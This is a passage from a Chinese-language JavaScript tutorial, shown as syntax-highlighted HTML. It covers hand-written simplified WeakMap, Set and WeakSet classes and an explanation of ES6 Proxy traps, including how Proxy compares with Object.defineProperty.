function_">get</span>(<span class="hljs-params">key</span>) &#123;<br>  <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">indexOf</span>(key);<br>  <span class="hljs-keyword">return</span> index !== -<span class="hljs-number">1</span> ? <span class="hljs-variable language_">this</span>[_values][index] : <span class="hljs-literal">undefined</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q: 请手写一个简化版的 WeakMap（不考虑弱引用）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleWeakMap</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> = <span class="hljs-string">`weakmap@<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span>; <span class="hljs-comment">// 唯一标识符</span><br>  &#125;<br><br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> key !== <span class="hljs-string">&#x27;object&#x27;</span> || key === <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Invalid key type&#x27;</span>);<br>    &#125;<br>    key[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] = value; <span class="hljs-comment">// 直接存储到对象上</span><br>  &#125;<br><br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">return</span> key?.[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> <span class="hljs-keyword">in</span> key;<br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(key)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">delete</span> key[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleWeakMap</span>();<br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>map.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;data&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(obj)); <span class="hljs-comment">// &#x27;data&#x27;</span><br>map.<span class="hljs-title function_">delete</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Q: 如何用数组实现 Set 的基本功能？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArraySet</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span> = [];<br>  &#125;<br><br>  <span class="hljs-title function_">add</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(value)) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">push</span>(value);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">includes</span>(value); <span class="hljs-comment">// 或 indexOf(value) !== -1</span><br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">indexOf</span>(value);<br>    <span class="hljs-keyword">if</span> (index &gt; -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-property">length</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">clear</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span> = [];<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>();<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-property">size</span>); <span class="hljs-comment">// 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-title function_">has</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// true</span><br>set.<span class="hljs-title function_">delete</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-title function_">has</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Q: 模拟实现一个支持基本操作的 WeakSet</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleWeakSet</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> = <span class="hljs-string">`weakset@<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span>; <span class="hljs-comment">// 唯一标识符</span><br>  &#125;<br><br>  <span class="hljs-title function_">add</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span> || obj === <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Invalid value used in weak set&#x27;</span>);<br>    &#125;<br>    obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标记对象</span><br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">return</span> !!obj &amp;&amp; obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] === <span class="hljs-literal">true</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">delete</span> obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleWeakSet</span>();<br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>ws.<span class="hljs-title function_">add</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// true</span><br>ws.<span class="hljs-title function_">delete</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h1 id="Proxy-和-Reflect"><a href="#Proxy-和-Reflect" class="headerlink" title="Proxy 和 Reflect"></a>Proxy 和 Reflect</h1><h2 id="Proxy-详解"><a href="#Proxy-详解" class="headerlink" title="Proxy 详解"></a>Proxy 详解</h2><h3 id="什么是Proxy？"><a href="#什么是Proxy？" class="headerlink" title="什么是Proxy？"></a>什么是Proxy？</h3><p>Proxy 是 ES6 引入的一种元编程特性，允许你创建一个对象的代理，从而拦截和自定义该对象的基本操作（如属性访问、赋值、枚举等），Proxy 提供了一种强大的机制来控制和扩展对象的行为。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br></code></pre></td></tr></table></figure><ul><li>target：要代理的目标对象</li><li>handler：包含自定义操作的对象，handler 为空时，没有任何拦截效果，访问 Proxy 等效于访问 target</li></ul><p>Proxy 是 ES6 原生提供的构造函数，Proxy 实例也可以用作其他对象的原型对象。需要注意的是：要想 Proxy 起作用，必须针对 Proxy 的实例（proxy）进行操作，而不是针对目标对象（target）进行操作。</p><h3 id="常用Handler方法（Traps）"><a href="#常用Handler方法（Traps）" class="headerlink" title="常用Handler方法（Traps）"></a>常用Handler方法（Traps）</h3><p><strong>get() - 拦截属性读取</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property, receiver</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`读取属性: <span class="hljs-subst">$&#123;property&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;, handler);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxy.<span class="hljs-property">name</span>); <span class="hljs-comment">// 输出: 读取属性: name → Alice</span><br></code></pre></td></tr></table></figure><p><strong>set() - 拦截属性设置</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value, receiver</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`设置属性: <span class="hljs-subst">$&#123;property&#125;</span> = <span class="hljs-subst">$&#123;value&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, handler);<br>proxy.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// 输出: 设置属性: age = 30</span><br></code></pre></td></tr></table></figure><p><strong>apply() - 拦截函数调用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, argumentsList</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`调用函数，参数: <span class="hljs-subst">$&#123;argumentsList&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">target</span>(...argumentsList) * <span class="hljs-number">2</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(sum, handler);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">proxy</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 输出: 调用函数，参数: 2,3 → 10</span><br></code></pre></td></tr></table></figure><p><strong>has() - 拦截 in 操作符</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">target, property</span>) &#123;<br>    <span class="hljs-keyword">if</span> (property.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;_&#x27;</span>)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 隐藏私有属性</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> property <span class="hljs-keyword">in</span> target;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-attr">_secret</span>: <span class="hljs-string">&#x27;123&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, handler);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> proxy); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;_secret&#x27;</span> <span class="hljs-keyword">in</span> proxy); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>construct() - 拦截 new 操作符</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">construct</span>(<span class="hljs-params">target, argumentsList, newTarget</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`创建实例: <span class="hljs-subst">$&#123;argumentsList&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">target</span>(...argumentsList);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProxyPerson</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(<span class="hljs-title class_">Person</span>, handler);<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyPerson</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>); <span class="hljs-comment">// 输出: 创建实例: Charlie</span><br></code></pre></td></tr></table></figure><h3 id="完整-Handler-方法列表"><a href="#完整-Handler-方法列表" class="headerlink" title="完整 Handler 方法列表"></a>完整 Handler 方法列表</h3><table><thead><tr><th align="left">方法</th><th align="left">描述</th><th align="left">触发操作</th></tr></thead><tbody><tr><td align="left">get(target, property, receiver)</td><td align="left">拦截属性读取</td><td align="left">proxy.property, proxy[‘property’]</td></tr><tr><td align="left">set(target, property, value, receiver)</td><td align="left">拦截属性设置</td><td align="left">proxy.property &#x3D; value</td></tr><tr><td align="left">has(target, property)</td><td align="left">拦截 in 操作符</td><td align="left">property in proxy</td></tr><tr><td align="left">apply(target, object, args)</td><td align="left">拦截函数调用</td><td align="left">proxy(…args), proxy.call(), proxy.apply()</td></tr><tr><td align="left">construct(target, args)</td><td align="left">拦截 new 操作符</td><td align="left">new proxy(…args)</td></tr><tr><td align="left">deleteProperty(target, property)</td><td align="left">拦截 delete 操作符</td><td align="left">delete proxy.property</td></tr><tr><td align="left">ownKeys(target)</td><td align="left">拦截对象属性枚举</td><td align="left">Object.keys(proxy), Object.getOwnPropertyNames(proxy)</td></tr><tr><td align="left">getOwnPropertyDescriptor(target, property)</td><td align="left">拦截属性描述符获取</td><td align="left">Object.getOwnPropertyDescriptor(proxy, property)</td></tr><tr><td align="left">defineProperty(target, property, propDesc)</td><td align="left">拦截属性定义</td><td align="left">Object.defineProperty(proxy, property, descriptor)</td></tr><tr><td align="left">getPrototypeOf(target)</td><td align="left">拦截原型获取</td><td align="left">Object.getPrototypeOf(proxy)</td></tr><tr><td align="left">setPrototypeOf(target, proto)</td><td align="left">拦截原型设置</td><td align="left">Object.setPrototypeOf(proxy, prototype)</td></tr><tr><td align="left">isExtensible(target)</td><td align="left">拦截对象可扩展性检查</td><td align="left">Object.isExtensible(proxy)</td></tr><tr><td align="left">preventExtensions(target)</td><td align="left">拦截阻止扩展操作</td><td align="left">Object.preventExtensions(proxy)</td></tr></tbody></table><h3 id="Proxy-和-Object-defineProperty-的关系"><a href="#Proxy-和-Object-defineProperty-的关系" class="headerlink" title="Proxy 和 Object.defineProperty 的关系"></a>Proxy 和 Object.defineProperty 的关系</h3><p><strong>核心概念对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">Object.defineProperty</th><th align="left">Proxy</th></tr></thead><tbody><tr><td align="left">引入时间</td><td align="left">ES5 (2009)</td><td align="left">ES6 (2015)</td></tr><tr><td align="left">主要目的</td><td align="left">定义&#x2F;修改对象属性的特性</td><td align="left">创建对象的代理，拦截基本操作</td></tr><tr><td align="left">操作级别</td><td align="left">属性级别</td><td align="left">对象级别</td></tr><tr><td align="left">拦截能力</td><td align="left">有限（主要是 get&#x2F;set）</td><td align="left">全面（13种操作）</td></tr><tr><td align="left">新增属性</td><td align="left">无法自动捕获</td><td align="left">可以自动捕获</td></tr><tr><td align="left">返回值</td><td align="left">修改后的对象</td><td align="left">新创建的代理对象</td></tr></tbody></table><p><strong>功能关系详解</strong></p><p>（1）相似之处：属性访问拦截</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 Object.defineProperty</span><br><span class="hljs-keyword">const</span> obj1 = &#123;&#125;;<br><span class="hljs-keyword">let</span> value = <span class="hljs-number">10</span>;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj1, <span class="hljs-string">&#x27;count&#x27;</span>, &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;获取 count&#x27;</span>);<br>    <span class="hljs-keyword">return</span> value;<br>  &#125;,<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">newValue</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;设置 count&#x27;</span>);<br>    value = newValue;<br>  &#125;<br>&#125;);<br><br>obj1.<span class="hljs-property">count</span>; <span class="hljs-comment">// 控制台: &quot;获取 count&quot;</span><br>obj1.<span class="hljs-property">count</span> = <span class="hljs-number">20</span>; <span class="hljs-comment">// 控制台: &quot;设置 count&quot;</span><br><br><span class="hljs-comment">// 使用 Proxy</span><br><span class="hljs-keyword">const</span> target = &#123;&#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`获取 <span class="hljs-subst">$&#123;prop&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> target[prop];<br>  &#125;,<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, value</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`设置 <span class="hljs-subst">$&#123;prop&#125;</span> 为 <span class="hljs-subst">$&#123;value&#125;</span>`</span>);<br>    target[prop] = value;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;);<br><br>proxy.<span class="hljs-property">name</span>; <span class="hljs-comment">// 控制台: &quot;获取 name&quot;</span><br>proxy.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// 控制台: &quot;设置 age 为 30&quot;</span><br></code></pre></td></tr></table></figure><p>（2）互补关系：Proxy 扩展了 defineProperty 的能力</p><p><strong>核心区别</strong></p><ul><li>拦截范围不同：defineProperty 只能拦截属性的读写操作（属性级别），无法拦截属性新增、删除等操作，Proxy 可以拦截整个对象的多种操作（对象级别）</li><li>Proxy 返回修对象，defineProperty 修改原对象</li></ul><h3 id="this-问题"><a href="#this-问题" class="headerlink" title="this 问题"></a>this 问题</h3><p>Proxy 代理目标对象时，目标对象内部的 this 会指向 Proxy 代理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> target = &#123;<br>  <span class="hljs-attr">m</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === proxy);<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> handler = &#123;&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br><br>target.<span class="hljs-title function_">m</span>() <span class="hljs-comment">// false</span><br>proxy.<span class="hljs-title function_">m</span>()  <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>此外，有些原生对象的内部属性，只有通过正确的 this 才能拿到，所以 Proxy 无法代理这些原生对象的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> target = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br><span class="hljs-keyword">const</span> handler = &#123;&#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br><br>proxy.<span class="hljs-title function_">getDate</span>();<br><span class="hljs-comment">// TypeError: this is not a Date object.</span><br></code></pre></td></tr></table></figure><h3 id="实际应用场景"><a href="#实际应用场景" class="headerlink" title="实际应用场景"></a>实际应用场景</h3><p><strong>数据验证</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> validator = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">&#x27;age&#x27;</span>) &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isInteger</span>(value)) &#123;<br>        <span class="hljs-keyword">throw</span> <span 